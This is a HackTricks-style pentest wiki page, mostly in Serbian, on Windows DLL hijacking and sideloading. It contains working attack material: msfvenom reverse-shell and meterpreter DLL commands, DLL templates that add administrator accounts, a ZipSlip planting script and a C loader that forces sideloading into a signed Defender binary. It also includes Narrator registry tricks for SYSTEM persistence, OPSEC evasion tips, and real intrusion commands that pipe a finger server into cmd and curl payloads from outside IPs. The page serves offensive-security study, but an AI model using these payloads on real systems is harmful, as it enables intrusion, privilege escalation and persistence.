# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulaciju poverljivom aplikacijom da učita maliciozni DLL. Ovaj termin obuhvata nekoliko taktika poput **DLL Spoofing, Injection, and Side-Loading**. Najčešće se koristi za izvršavanje koda, postizanje persistence, i, ređe, privilege escalation. Iako se ovde fokusiramo na eskalaciju, metoda hijackinga ostaje ista bez obzira na cilj.

### Uobičajene tehnike

Koriste se različite metode za DLL hijacking, čija je efikasnost zavisna od načina na koji aplikacija učitava DLL-ove:

1. **DLL Replacement**: Zamena originalnog DLL-a malicioznim, po potrebi koristeći DLL Proxying da se sačuva funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje malicioznog DLL-a u pretraživački put pre legitimnog, iskorišćavajući obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje malicioznog DLL-a za koji aplikacija misli da je nepostojeći obavezni DLL i pokuša da ga učita.
4. **DLL Redirection**: Izmena parametara pretrage kao što su %PATH% ili `.exe.manifest` / `.exe.local` fajlovi da usmerite aplikaciju na maliciozni DLL.
5. **WinSxS DLL Replacement**: Zamenjivanje legitimnog DLL-a malicioznom kopijom u WinSxS direktorijumu, metoda često povezana sa DLL side-loading.
6. **Relative Path DLL Hijacking**: Postavljanje malicioznog DLL-a u direktorijum pod kontrolom korisnika zajedno sa kopiranom aplikacijom, što podseća na Binary Proxy Execution tehnike.

> [!TIP]
> Za korak-po-korak lanac koji slaže HTML staging, AES-CTR konfiguracije i .NET implantate preko DLL sideloading-a, pregledajte tok rada ispod.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Pronalaženje nedostajućih DLL-ova

Najčešći način da se pronađu nedostajući DLL-ovi u sistemu je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz Sysinternals-a, uz podešavanje sledeća 2 filtera:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i prikazivanje samo **File System Activity**:

![](<../../../images/image (153).png>)

Ako tražite nedostajuće DLL-ove generalno, ostavite ovo da radi nekoliko **sekundi**.  
Ako tražite nedostajući DLL unutar određenog izvršnog fajla, treba da postavite još jedan filter poput "Process Name" "contains" `<exec name>`, pokrenete izvršenje, i zaustavite hvatanje događaja.

## Eksploatisanje nedostajućih DLL-ova

Da bismo eskalirali privilegije, najbolja šansa je da možemo **upisati DLL koji će neki privilegovani proces pokušati da učita** na nekom od mesta na kojima će se tražiti. Dakle, moći ćemo da **upisemo** DLL u **folder** gde se **DLL traži pre** foldera u kojem se nalazi **originalni DLL** (retki slučaj), ili ćemo moći da **upisujemo u neki folder gde će se DLL tražiti** a originalni **DLL ne postoji** ni u jednom folderu.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows aplikacije traže DLL-ove prateći skup unapred definisanih pretraživačkih putanja, u određenom redosledu. Problem DLL hijacking-a nastaje kada je maliciozni DLL strateški postavljen u jedan od tih direktorijuma tako da bude učitan pre autentičnog DLL-a. Rešenje je da aplikacija koristi apsolutne putanje kada referencira potrebne DLL-ove.

Možete videti **DLL search order na 32-bitnim** sistemima ispod:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ovo je **podrazumevani** redosled pretrage sa **SafeDllSearchMode** uključenim. Kada je isključen, trenutni direktorijum se penje na drugo mesto. Da biste onemogućili ovu funkciju, kreirajte registry vrednost **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućeno).

Ako je [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozvan sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

Na kraju, imajte na umu da **DLL može biti učitan navođenjem apsolutne putanje umesto samo imena**. U tom slučaju, taj DLL će **biti tražen samo u toj putanji** (ako taj DLL ima zavisnosti, one će se tražiti kao da su učitane po imenu).

Postoje i drugi načini da se izmeni redosled pretrage, ali ih ovde neću objašnjavati.

### Povezivanje proizvoljnog zapisa fajla u missing-DLL hijack

1. Koristite **ProcMon** filtere (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) da prikupite nazive DLL-ova koje proces proverava, ali ne može da pronađe.
2. Ako binar radi po rasporedu/servisu (**schedule/service**), ubacivanje DLL-a sa jednim od tih imena u **application directory** (search-order entry #1) biće učitano pri sledećem izvršenju. U jednom .NET scanner slučaju, proces je tražio `hostfxr.dll` u `C:\samples\app\` pre nego što je učitao pravu kopiju iz `C:\Program Files\dotnet\fxr\...`.
3. Napravite payload DLL (npr. reverse shell) sa bilo kojim export-om: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ako je vaš primitiv **ZipSlip-style arbitrary write**, napravite ZIP čiji unos izlazi iz ekstraktovanog direktorijuma tako da DLL završi u app folderu:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostavite arhivu u nadgledani inbox/share; kada scheduled task ponovo pokrene proces, on će učitati zlonamerni DLL i izvršiti vaš kod kao service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

Ključna ideja
- Sastavite process parameters koristeći RtlCreateProcessParametersEx i obezbedite prilagođeni DllPath koji pokazuje na folder pod vašom kontrolom (npr. direktorijum u kojem se nalazi vaš dropper/unpacker).
- Kreirajte proces pomoću RtlCreateUserProcess. Kada ciljni binarni fajl razrešava DLL po imenu, loader će konsultovati ovaj prosleđeni DllPath tokom rezolucije, omogućavajući pouzdano sideloading čak i kada zlonamerni DLL nije u istom direktorijumu kao ciljni EXE.

Napomene/ograničenja
- Ovo utiče na kreirani child process; razlikuje se od SetDllDirectory, koji utiče samo na trenutni proces.
- Cilj mora importovati ili pozvati LoadLibrary za DLL po imenu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodirane apsolutne putanje ne mogu biti hijackovane. Forwarded exports i SxS mogu promeniti prioritet.

Minimalni C primer (ntdll, wide strings, pojednostavljeno rukovanje greškama):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operativni primer upotrebe
- Postavite maliciozni xmllite.dll (exporting the required functions or proxying to the real one) u vaš direktorijum naveden u DllPath.
- Pokrenite signed binary za koji je poznato da traži xmllite.dll po imenu koristeći gore opisanu tehniku. The loader resolves the import via the supplied DllPath and sideloads your DLL.

Ova tehnika je primećena in-the-wild da pokreće multi-stage sideloading chains: inicijalni launcher drop-uje helper DLL, koji potom spawn-uje Microsoft-signed, hijackable binary sa custom DllPath-om da bi primorao učitavanje napadačevog DLL-a iz staging directory.


#### Exceptions on dll search order from Windows docs

U Windows dokumentaciji su navedeni određeni izuzeci od standardnog redosleda pretrage DLL-ova:

- Kada se naiđe na **DLL koji deli ime sa onim koji je već učitan u memoriji**, sistem zaobilazi uobičajenu pretragu. Umesto toga, on proverava redirection i manifest pre nego što podrazumevano koristi DLL koji je već u memoriji. **U tom scenariju sistem ne vrši pretragu za DLL-om**.
- U slučajevima kada je DLL prepoznat kao **known DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju tog known DLL-a, zajedno sa svim njegovim zavisnim DLL-ovima, **odustajući od procesa pretrage**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih known DLL-ova.
- Ako **DLL ima zavisnosti**, pretraga za tim zavisnim DLL-ovima vrši se kao da su navedeni samo po svojim **module names**, bez obzira na to da li je početni DLL bio identifikovan kroz punu putanju.

### Eskalacija privilegija

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi pod **drugim privilegijama** (horizontalno ili lateralno kretanje), a kome **nedostaje DLL**.
- Osigurajte da postoji **write access** za bilo koji **direktorijum** u kojem će se **DLL** tražiti. Ta lokacija može biti direktorijum izvršnog fajla ili direktorijum unutar system path-a.

Da, zahtevi su komplikovani za pronaći jer je **po defaultu pomalo čudno naći privilegovani izvršni fajl kojem nedostaje dll** i još je **čudnije imati write permissions na folder u system path-u** (to po defaultu nije moguće). Ali, u pogrešno konfigurisanom okruženju ovo je moguće.\
Ako imate sreće i ispunjavate zahteve, možete pogledati projekat [UACME](https://github.com/hfiref0x/UACME). Čak i ako je **glavni cilj projekta bypass UAC**, možda ćete tamo naći **PoC** of a Dll hijaking za verziju Windows-a koju možete iskoristiti (verovatno samo menjajući putanju foldera gde imate write permissions).

Imajte na umu da možete **proveriti svoje dozvole u folderu** radeći:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih foldera u PATH-u**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports izvršne datoteke i exports dll-a pomoću:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatski alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate write permissions na bilo koji folder unutar system PATH.\
Drugi korisni automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll_.

### Primer

Ako pronađete iskoristiv scenario, jedna od najbitnijih stvari za uspešan exploit biće da **create a dll that exports at least all the functions the executable will import from it**. Imajte na umu da Dll Hijacking može biti koristan za [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili za [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system). Možete pronaći primer **how to create a valid dll** u ovoj studiji o dll hijacking fokusiranoj na izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Štaviše, u sledećem odeljku možete naći neke osnovne dll kodove koji mogu biti korisni kao templates ili za kreiranje dll-a sa nepotrebnim funkcijama izvezenim.

## **Creating and compiling Dlls**

### **Dll Proxifying**

U suštini, **Dll proxy** je Dll koji može da izvrši vaš maliciozni kod prilikom učitavanja, ali takođe i da se ponaša i radi kako se očekuje preusmeravajući sve pozive na pravu biblioteku.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo navesti izvršni fajl i izabrati biblioteku koju želite proxify i generisati proxified dll, ili navesti Dll i generisati proxified dll.

### **Meterpreter**

**Get rev shell (x64)::**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobijte meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreirajte korisnika (x86, nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vaše sopstveno

Obratite pažnju da u nekoliko slučajeva DLL koji kompajlirate mora **izvoziti nekoliko funkcija** koje će biti učitane od strane ciljanog procesa; ako te funkcije ne postoje, **binarni fajl neće moći da ih učita** i **eksploatacija će propasti**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje proverava predvidljivi, specifičan za jezik localization DLL pri pokretanju koji može biti hijacked za arbitrary code execution i persistence.

Ključne činjenice
- Putanja provere (trenutne verzije): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy putanja (starije verzije): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako na OneCore putanji postoji zapisivi attacker-controlled DLL, on se učita i izvrši se `DllMain(DLL_PROCESS_ATTACH)`. No exports are required.

Otkrivanje pomoću Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja gore navedene putanje.

Minimalni DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Naivan hijack će govoriti/istaknuti UI. Da biste ostali tihi, pri attach-u nabrojite Narrator niti, otvorite glavnu nit (`OpenThread(THREAD_SUSPEND_RESUME)`) i pozovite `SuspendThread` na njoj; nastavite u sopstvenoj niti. Pogledajte PoC za kompletan kod.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Sa navedenim, pokretanje Narrator učitava zasađeni DLL. Na secure desktop (logon screen), pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Izvršavanje prestaje kada se RDP sesija zatvori—inject/migrate brzo.

Bring Your Own Accessibility (BYOA)
- Možete klonirati ugrađeni Accessibility Tool (AT) registry entry (npr. CursorIndicator), izmeniti ga da pokazuje na proizvoljan binary/DLL, importovati ga, zatim postaviti `configuration` na to AT ime. Ovo omogućava proxy izvršavanje proizvoljnog koda unutar Accessibility framework-a.

Notes
- Pisanje pod `%windir%\System32` i menjanje HKLM vrednosti zahteva admin prava.
- Cela payload logika može živeti u `DLL_PROCESS_ATTACH`; nisu potrebni export-i.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ovaj slučaj demonstrira **Phantom DLL Hijacking** u Lenovo-ovom TrackPoint Quick Menu (`TPQMAssistant.exe`), praćeno kao **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

Napadač može postaviti maliciozni `hostfxr.dll` stub u isti direktorijum, iskorišćavajući nedostajući DLL da ostvari izvršavanje koda u kontekstu korisnika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Tok napada

1. Kao standardni korisnik, postavite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da zakazani zadatak pokrene u 9:30 u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, maliciozni DLL će se pokrenuti u administratorskoj sesiji na medium integrity.
4. Povežite standardne UAC bypass techniques kako biste podigli privilegije sa medium integrity na SYSTEM.

## Studija slučaja: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Napadači često kombinuju MSI-based droppers sa DLL side-loading kako bi izvršavali payloads pod trusted, signed procesom.

Chain overview
- Korisnik preuzme MSI. A CustomAction se tiho pokreće tokom GUI instalacije (npr. LaunchApplication ili VBScript action), rekonstruisući sledeću fazu iz embedded resources.
- Dropper upisuje legitimni, signed EXE i maliciozni DLL u isti direktorijum (primer par: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Kada se signed EXE pokrene, Windows DLL search order učitava wsc.dll iz working directory-a prvo, izvršavajući attacker code pod signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Tražite unose koji pokreću izvršne fajlove ili VBScript. Primer sumnjivog obrasca: LaunchApplication koji izvršava embedded file u pozadini.
- U Orca (Microsoft Orca.exe), pregledajte CustomAction, InstallExecuteSequence i Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrativno izdvajanje: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ili koristite lessmsi: lessmsi x package.msi C:\out
- Tražite više malih fragmenata koji su konkatenirani i dekriptovani od strane VBScript CustomAction. Uobičajeni tok:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Postavite ova dva fajla u isti direktorijum:
- wsc_proxy.exe: legitimno potpisan host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: attacker DLL. Ako nisu potrebni specifični exports, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite potrebne exports u originalnu biblioteku dok pokrećete payload u DllMain.
- Sastavite minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za zahteve za export koristite proxying framework (npr., DLLirant/Spartacus) da generišete forwarding DLL koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na resolve-ovanje DLL imena od strane host binary. Ako host koristi apsolutne puteve ili safe loading flag-ove (npr., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack može da ne uspe.
- KnownDLLs, SxS, i forwarded exports mogu uticati na precedence i moraju se uzeti u obzir pri izboru host binary i export seta.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point je opisao kako Ink Dragon deploy-uje ShadowPad koristeći **three-file triad** da se uklopi u legitimni softver dok čuva core payload enkriptovan na disku:

1. **Signed host EXE** – dobavljači kao što su AMD, Realtek ili NVIDIA su zloupotrebljeni (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Napadači preimenuju izvršni fajl da liči na Windows binary (na primer `conhost.exe`), ali Authenticode potpis ostaje važeći.
2. **Malicious loader DLL** – postavljen pored EXE-a sa očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binary obfuskovan ScatterBrain framework-om; jedini zadatak mu je da locira encrypted blob, dekriptuje ga i reflectively map ShadowPad.
3. **Encrypted payload blob** – često se čuva kao `<name>.tmp` u istom direktorijumu. Nakon memory-mappinga dekriptovanog payload-a, loader briše TMP fajl da uništi forenzičke dokaze.

Tradecraft napomene:

* Preimenovanje potpisanog EXE-a (uz zadržavanje originalnog `OriginalFileName` u PE header-u) omogućava da se prerušava u Windows binary, ali zadrži vendor signature, pa replicirajte Ink Dragon naviku da drop-uju `conhost.exe`-looking binarne koje su u stvarnosti AMD/NVIDIA utiliti.
* Pošto izvršni fajl ostaje trusted, većina allowlisting kontrola zahteva samo da se vaš malicious DLL nalazi pored njega. Fokusirajte se na prilagođavanje loader DLL-a; potpisani parent obično može da se izvršava nepromenjen.
* ShadowPad-ov decryptor očekuje da TMP blob bude pored loader-a i da bude writable kako bi mogao da zero-uje fajl nakon mapiranja. Ostavite direktorijum writable dok se payload ne učita; kada je u memoriji, TMP fajl može bezbedno da se obriše iz OPSEC razloga.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatori kombinuju DLL sideloading sa LOLBAS tako da je jedini custom artefakt na disku malicious DLL pored trusted EXE-a:

- **Remote command loader (Finger):** Hidden PowerShell spawn-uje `cmd.exe /c`, vuče komande sa Finger servera i pipe-uje ih u `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` vuče TCP/79 text; `| cmd` izvršava server response, omogućavajući operatorima da rotiraju second stage server-side.

- **Built-in download/extract:** Download-ujte arhivu sa benign ekstenzijom, raspakujte je i stage-ujte sideload target plus DLL pod random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` skriva progress i prati redirect-ove; `tar -xf` koristi Windows-ov ugrađeni tar.

- **WMI/CIM launch:** Pokrenite EXE preko WMI tako da telemetrija pokaže CIM-created proces dok učitava colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Radi sa binarnim fajlovima koji preferiraju lokalne DLL-ove (npr., `intelbq.exe`, `nearby_share.exe`); payload (npr., Remcos) se izvršava pod trusted imenom.

- **Hunting:** Alert-ujte na `forfiles` kada se `/p`, `/m`, i `/c` pojave zajedno; to je retko izvan admin skripti.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Recentna Lotus Blossom intrusion je zloupotrebila trusted update chain da isporuči NSIS-packed dropper koji je stage-ovao DLL sideload plus potpuno in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, drop-uje preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll`, i encrypted blob `BluetoothService`, a zatim pokreće EXE.
- Host EXE import-uje `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` mmap-load-uje blob; `LogWrite` ga dekriptuje custom LCG-based stream-om (konstante **0x19660D** / **0x3C6EF35F**, key material izveden iz prethodnog hash-a), prepisuje buffer plaintext shellcode-om, oslobađa tempove i jump-uje na njega.
- Da bi izbegao IAT, loader rešava API-je tako što hash-uje export imena koristeći **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, zatim primenjuje Murmur-style avalanche (**0x85EBCA6B**) i upoređuje sa salted target hash-evima.

Main shellcode (Chrysalis)
- Dekriptuje PE-like main modul ponavljanjem add/XOR/sub sa ključem `gQ2JR&9;` kroz pet prolaza, zatim dinamički load-uje `Kernel32.dll` → `GetProcAddress` da završi import resolution.
- Rekonstruiše DLL name stringove u runtime-u putem per-character bit-rotate/XOR transformacija, zatim load-uje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
